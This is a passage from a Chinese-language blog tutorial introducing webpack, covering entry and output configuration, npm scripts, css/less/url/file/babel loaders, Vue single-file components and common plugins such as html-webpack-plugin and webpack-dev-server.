title="起步"></a>起步</h2><ol><li><p>创建对应的文件夹</p><ul><li>dist文件夹：用于存放之后打包的文件</li><li>src文件夹：用于存放我们写的源文件</li><li>main.js：项目的入口文件。</li><li>mathUtils.js：定义了一些数学工具函数，可以在其他地方引用，并且使用。</li><li>index.html：浏览器打开展示的首页html</li><li>package.json：通过npm init生成的，npm包管理的文件</li></ul></li><li><p>打包指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpack src/main.js dist/bundle.js</span><br></pre></td></tr></table></figure></li><li><p>index.html使用打包后的文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"dist/bundle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="入口和出口"><a href="#入口和出口" class="headerlink" title="入口和出口"></a>入口和出口</h3><p>创建一个webpack.config.js文件用来将webpack打包命令进行简化，从而直接在配置中定义出口和入口</p><p><strong>注意：</strong>文件名字必须命名为webpack.config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">'./public/02-inport.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.join(__dirname,<span class="string">'dist'</span>),</span><br><span class="line">    filename: <span class="string">'bundle.js'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="局部安装webpack的问题"><a href="#局部安装webpack的问题" class="headerlink" title="局部安装webpack的问题"></a>局部安装webpack的问题</h3><p>启动webpack进行打包需要定位到node_modules/.bin/webpack才能执行webpack命令，或者，通过下面的方式</p><h3 id="package-json中定义启动"><a href="#package-json中定义启动" class="headerlink" title="package.json中定义启动"></a>package.json中定义启动</h3><p>在package.json中定义启动有什么优势呢</p><p>package.json中的scripts的脚本在执行时，会按照一定的顺序寻找命令对应的位置。</p><p>首先，会寻找本地的node_modules/.bin路径中对应的命令。</p><p>如果没有找到，会去全局的环境变量中寻找</p><p>下面介绍一下使用</p><ol><li><p>首先是在json文件下定义npm命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"scripts"</span>: &#123;</span><br><span class="line">  <span class="string">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</span><br><span class="line">  <span class="string">"build"</span>: <span class="string">"npx webpack"</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>cmd执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure></li></ol><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p><em>loader</em> 让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）。loader 可以将所有类型的文件转换为 webpack 能够处理的有效<a href="https://www.webpackjs.com/concepts/modules" target="_blank" rel="noopener">模块</a>，然后你就可以利用 webpack 的打包能力，对它们进行处理。</p><p>本质上，webpack loader 将所有类型的文件，转换为应用程序的依赖图（和最终的 bundle）可以直接引用的模块。</p></blockquote><p>在更高层面，在 webpack 的配置中 <strong>loader</strong> 有两个目标：</p><ol><li><code>test</code> 属性，用于标识出应该被对应的 loader 进行转换的某个或某些文件。</li><li><code>use</code> 属性，表示进行转换时，应该使用哪个 loader。</li></ol><p><strong>loader通用使用过程</strong></p><ol><li>通过npm安装需要使用的loader</li><li>在webpack.config.js中的modules关键字的loaders下进行配置</li></ol><h3 id="css-loader、style-loader"><a href="#css-loader、style-loader" class="headerlink" title="css-loader、style-loader"></a>css-loader、style-loader</h3><p><strong>作用</strong></p><p>转换css文件（css-loader）并对其进行解析（style-loader）后样式改变</p><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev css-loader style-loader</span><br></pre></td></tr></table></figure><p><strong>main.js文件导入css模块</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> css <span class="keyword">from</span> <span class="string">'file.css'</span></span><br></pre></td></tr></table></figure><p><strong>webpack.config.js</strong>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/i</span>,</span><br><span class="line">        use: [<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里解释一下，为什么style-loader在css-loader前面</p><p>因为webpack在读取使用的loader的过程中，是按照从右向左的顺序读取的</p><h3 id="less-loader"><a href="#less-loader" class="headerlink" title="less-loader"></a>less-loader</h3><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev less-loader less</span><br></pre></td></tr></table></figure><p><strong>配置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">      loader: <span class="string">'style-loader'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'css-loader'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'less-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        lessOptions: &#123;</span><br><span class="line">          strictMath: <span class="literal">true</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>这样就可以解析less文件</p><h3 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h3><h4 id="url-loader"><a href="#url-loader" class="headerlink" title="url-loader"></a>url-loader</h4><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev url-loader</span><br></pre></td></tr></table></figure><p><strong>配置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.(png|jpg|gif|jpeg)$/i</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'url-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      limit: <span class="number">11000</span>,</span><br><span class="line">      name: <span class="string">'img/[name].[hash:6].[ext]'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;, ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>打包后你会发现，运行index.html，在f12窗口中查看一下，你会发现背景图是通过base64显示出来的，这也是limit属性的作用，当图片小于11kb时，会对图片进行base64编码</p><p>但是，如果你放了一张超过11kb的照片后，你会发现，打包的时候它会报错，这个时候我们就需要安装另外一个模块file-loader</p><h4 id="file-loader"><a href="#file-loader" class="headerlink" title="file-loader"></a>file-loader</h4><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev file-loader</span><br></pre></td></tr></table></figure><p><strong>配置</strong></p><p>这里要注意，不能同时配置url-loader和file-loader，也就是说你配了url-loader后就不要去配置file-loader，反过来也是，你配置了file-loader后就不要去配置url-loader了，否则打包的时候会报错</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.(png|jpe?g|gif)$/i</span>,</span><br><span class="line">  loader: <span class="string">'file-loader'</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    name: <span class="string">'img/[name].[hash:6].[ext]'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="修改文件名字"><a href="#修改文件名字" class="headerlink" title="修改文件名字"></a>修改文件名字</h4><p>我们发现webpack自动帮助我们生成一个非常长的名字</p><ul><li>这是一个32位hash值，目的是防止名字重复</li><li>但是，真实开发中，我们可能对打包的图片名字有一定的要求</li><li>比如，将所有的图片放在一个文件夹中，跟上图片原来的名称，同时也要防止重复</li></ul><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/image-20200921211143890.png" alt="image-20200921211143890"></p><p>所以，我们可以在options中添加上如下选项：</p><ul><li><p>img：文件要打包到的文件夹</p></li><li><p>name：获取图片原来的名字，放在该位置</p></li><li><p>hash:8：为了防止图片名称冲突，依然使用hash，但是我们只保留8位</p></li><li><p>ext：使用图片原来的扩展名</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.(png|jpg|gif|jpeg)$/i</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'url-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      limit: <span class="number">11000</span>,</span><br><span class="line">      name: <span class="string">'img/[name].[hash:6].[ext]'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;, ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>但是，我们会发现图片并没有显示出来，这是因为图片使用的路径不正确</p><ul><li><p>默认情况下，webpack会将生成的路径直接返回给使用者</p></li><li><p>但是，我们整个程序是打包在dist文件夹下的，所以这里我们需要在路径下再添加一个dist/，即在output选项里添加publishPath：’dist/‘</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  path: path.join(__dirname, <span class="string">'dist'</span>),</span><br><span class="line">  filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">  publicPath: <span class="string">'dist/'</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="ES6语法处理babel-loader"><a href="#ES6语法处理babel-loader" class="headerlink" title="ES6语法处理babel-loader"></a>ES6语法处理babel-loader</h3><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev babel-loader@7 babel-core babel-preset-es2015</span><br></pre></td></tr></table></figure><p><strong>配置</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.m?js$/</span>,</span><br><span class="line">  exclude: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">  use: &#123;</span><br><span class="line">    loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      presets: [<span class="string">'es2015'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就可以看到打包后ES转成ES5的语法了</p><h2 id="webpack配置vue🔺"><a href="#webpack配置vue🔺" class="headerlink" title="webpack配置vue🔺"></a>webpack配置vue🔺</h2><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>当我们使用上vue后，你会发现，那些页面渲染不出来且报出了一个这样的错误</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/image-20200922084012737.png" alt="image-20200922084012737"></p><p>这是一个关于runtime-only和runtime-compiler之间的问题，后面会有补充</p><p>这个时候，你就需要在webpack的配置文件配置下面的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">  alias: &#123;</span><br><span class="line">    <span class="string">'vue$'</span>: <span class="string">'vue/dist/vue.esm.js'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>ok，问题就解决了</p><h3 id="单文件组件🔺"><a href="#单文件组件🔺" class="headerlink" title="单文件组件🔺"></a>单文件组件🔺</h3><p>先放上官网对其介绍</p><blockquote><p>在很多 Vue 项目中，我们使用 <code>Vue.component</code> 来定义全局组件，紧接着用 <code>new Vue({ el: &#39;#container &#39;})</code> 在每个页面内指定一个容器元素。</p><p>这种方式在很多中小规模的项目中运作的很好，在这些项目里 JavaScript 只被用来加强特定的视图。但当在更复杂的项目中，或者你的前端完全由 JavaScript 驱动的时候，下面这些缺点将变得非常明显：</p><ul><li><strong>全局定义 (Global definitions)</strong> 强制要求每个 component 中的命名不得重复</li><li><strong>字符串模板 (String templates)</strong> 缺乏语法高亮，在 HTML 有多行的时候，需要用到丑陋的 <code>\</code></li><li><strong>不支持 CSS (No CSS support)</strong> 意味着当 HTML 和 JavaScript 组件化时，CSS 明显被遗漏</li><li><strong>没有构建步骤 (No build step)</strong> 限制只能使用 HTML 和 ES5 JavaScript，而不能使用预处理器，如 Pug (formerly Jade) 和 Babel</li></ul><p>文件扩展名为 <code>.vue</code> 的 <strong>single-file components (单文件组件)</strong> 为以上所有问题提供了解决方法，并且还可以使用 webpack 或 Browserify 等构建工具。</p></blockquote><p>简单的来讲，为了避免全局变量污染，避免多个子组件的存在导致代码易读性变得非常差，和CSS样式被遗漏，vue就创造了单文件组件，每个组件都有其定义，每个组件都单独分开，使结构更加清晰，并使页面形成树结构。</p><p>下面是单组件的代码示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1 class&#x3D;&quot;aaa&quot;&gt;我是子组件&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">&#x2F;&#x2F;将配置输出</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &#39;woshizizujian&#39;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.aaa &#123;</span><br><span class="line">  color: yellow;</span><br><span class="line">  font-size: 20px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>父节点代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;title&quot;&gt;&#123;&#123;message&#125;&#125;&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;cpn&gt;&lt;&#x2F;cpn&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">&#x2F;&#x2F;将子组件引入页面</span><br><span class="line">import cpn from &#39;.&#x2F;cpn.vue&#39;</span><br><span class="line">&#x2F;&#x2F;输出自身配置</span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    cpn</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &#39;你好啊&#39;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.title &#123;</span><br><span class="line">  color: orange;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>main.js最终引用并简单配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./src/vue/App.vue'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  template: <span class="string">'&lt;App/&gt;'</span>,</span><br><span class="line">  components: &#123;</span><br><span class="line">    App</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>主页面在需要用到组件的地方定义其绑定的标签即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>大家好啊？<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"img"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./dist/bundle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，你想要解析vue文件，你还需要安装对应的loader</p><ul><li>vue-loader</li><li>vue-template-compiler</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save-dev vue-loader vue-template-compiler</span><br></pre></td></tr></table></figure><p>然后就是配置啦，我这里因为vue-loader装的是13的版本，所以就不需要具体做它的相关插件配置，下面是vue-template-compiler（渲染vue）和vue-loader（解析vue）的相关配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">  use: [<span class="string">'vue-loader'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关于关注点分离"><a href="#关于关注点分离" class="headerlink" title="关于关注点分离"></a>关于关注点分离</h3><p>还是先放出官网的介绍</p><blockquote><p>一个重要的事情值得注意，<strong>关注点分离不等于文件类型分离。</strong>在现代 UI 开发中，我们已经发现相比于把代码库分离成三个大的层次并将其相互交织起来，把它们划分为松散耦合的组件再将其组合起来更合理一些。在一个组件里，其模板、逻辑和样式是内部耦合的，并且把他们搭配在一起实际上使得组件更加内聚且更可维护。</p></blockquote><p>将页面拆分成多个组件，导航栏、搜索栏、底部栏等等，这既降低了组件的耦合度，又提高了组件的可复用性，更加适合我们的惯用思维，将大的问题拆成多个小的问题，一一解决，最后解决掉大问题，而这些处理掉小问题的解决方法又可以在将来的某个时候直接用上，何乐而不为呢</p><h2 id="webpack-plugin"><a href="#webpack-plugin" class="headerlink" title="webpack-plugin"></a>webpack-plugin</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><ul><li><p>plugin是什么？</p><ul><li><p>plugin是插件的意思，通常是用于对某个现有的架构进行扩展。</p></li><li><p>webpack中的插件，就是对webpack现有功能的各种扩展，比如打包优化，文件压缩等等。</p></li></ul></li><li><p>loader和plugin区别</p><ul><li><p>loader主要用于转换某些类型的模块，它是一个转换器。</p></li><li><p>plugin是插件，它是对webpack本身的扩展，是一个扩展器。</p></li></ul></li><li><p>plugin的使用过程：</p><ol><li><p>通过npm安装需要使用的plugins(某些webpack已经内置的插件不需要安装)</p></li><li><p>在webpack.config.js中的plugins中配置插件</p></li></ol></li></ul><h3 id="添加版权信息"><a href="#添加版权信息" class="headerlink" title="添加版权信息"></a>添加版权信息</h3><p>这是webpack自带的一个插件，如何使用呢</p><ol><li><p>首先在webpack.config.js文件中引入webpack</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">'我是版权信息哈哈哈'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>结果显示</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/image-20200923110703505.png" alt="image-20200923110703505"></p></li></ol><h3 id="打包html"><a href="#打包html" class="headerlink" title="打包html"></a>打包html</h3><p><strong>简介:</strong> 可以将你定义的html模板在生产环境下打包并生成html文件，且会自动绑定bundle.js文件</p><p><strong>安装：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install html-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure><p><strong>使用:</strong></p><ol><li><p>引用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">'我是版权信息哈哈哈'</span>),</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: <span class="string">"main.html"</span> <span class="comment">//模板</span></span><br><span class="line">  &#125;),</span><br><span class="line">],</span><br></pre></td></tr></table></figure></li></ol><h3 id="js压缩"><a href="#js压缩" class="headerlink" title="js压缩"></a>js压缩</h3><p><strong>简介：</strong>对js等文件进行压缩处理</p><p><strong>安装:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install uglifyjs-webpack-plugin@1.1.1 --save-dev</span><br></pre></td></tr></table></figure><p><strong>使用</strong>：</p><ol><li><p>引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Uglifyjs = <span class="built_in">require</span>(<span class="string">'uglifyjs-webpack-plugin'</span>)</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> Uglifyjs(),</span><br><span class="line">],</span><br></pre></td></tr></table></figure></li></ol><p>很简单有没有，不过在最新的vue版本，已经可以自动压缩了，所以看看就可以了</p><h3 id="vue搭建本地服务器"><a href="#vue搭建本地服务器" class="headerlink" title="vue搭建本地服务器"></a>vue搭建本地服务器</h3><p><strong>简介：</strong>webpack提供了一个可选的本地开发服务器，这个本地服务器基于node.js搭建，内部使用express框架，可以实现我们想要的让浏览器自动刷新显示我们修改后的结果。</p><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev webpack-dev-server@2.9.1</span><br></pre></td></tr></table></figure><p><strong>使用</strong>（不需要引入模块，直接进行配置，注意：它和entry、output等是并列关系）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 